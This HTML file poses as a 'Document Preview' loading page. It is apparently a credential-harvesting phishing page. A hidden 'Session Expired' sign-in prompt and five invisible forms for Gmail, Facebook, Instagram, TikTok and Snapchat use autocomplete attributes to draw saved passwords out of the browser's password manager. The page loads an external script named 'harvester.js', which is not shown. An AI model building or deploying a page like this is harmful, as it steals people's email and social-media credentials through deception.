<!DOCTYPE html>
<html>
<head>
  <title>Document Preview</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .preview-container {
      background-color: white;
      padding: 2rem;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 2s linear infinite;
      margin: 0 auto 1rem;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .honeypot-container {
      display: none; /* Hidden by default */
      background-color: white;
      padding: 2rem 1rem;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
    }
    #honeypot-input {
      padding: 15px;
      width: 80%;
      max-width: 300px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 1.1em;
      margin-top: 15px;
      text-align: center;
    }
    .hidden-form {
        display: none;
    }
  </style>
</head>
<body>
  <div class="preview-container">
    <div class="loader"></div>
    <p>Loading document preview...</p>
  </div>

  <div class="honeypot-container">
      <h2>Session Expired</h2>
      <p>Please tap here to sign in again.</p>
      <input type="password" id="honeypot-input" placeholder="Tap here to sign in">
  </div>

  <!-- Hidden forms -->
  <form id="gmail-form" class="hidden-form">
    <input type="email" name="email" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="facebook-form" class="hidden-form">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="instagram-form" class="hidden-form">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="tiktok-form" class="hidden-form">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>
  <form id="snapchat-form" class="hidden-form">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>

  <script src="harvester.js"></script>

</body>
</html>
